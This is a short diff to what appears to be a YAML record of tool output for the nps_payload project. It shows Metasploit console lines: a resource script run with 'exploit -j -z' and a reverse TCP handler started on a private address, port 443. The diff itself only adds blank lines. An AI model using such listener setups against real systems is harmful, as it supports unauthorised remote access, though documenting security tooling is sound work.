@@ -38,6 +38,7 @@ output: 'root@kali:~/nps_payload# msfconsole -r msbuild_nps.rc
 
   [*] Exploit completed, but no session was created.
 
+
   [*] Started reverse TCP handler on 10.10.10.100:443'
 created_at: '2019-11-14T23:38:41.557275+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
@@ -72,3 +73,5 @@ resource (msbuild_nps.rc)> exploit -j -z
 
 [*] Started reverse TCP handler on 10.10.10.100:443
 ```
+
+
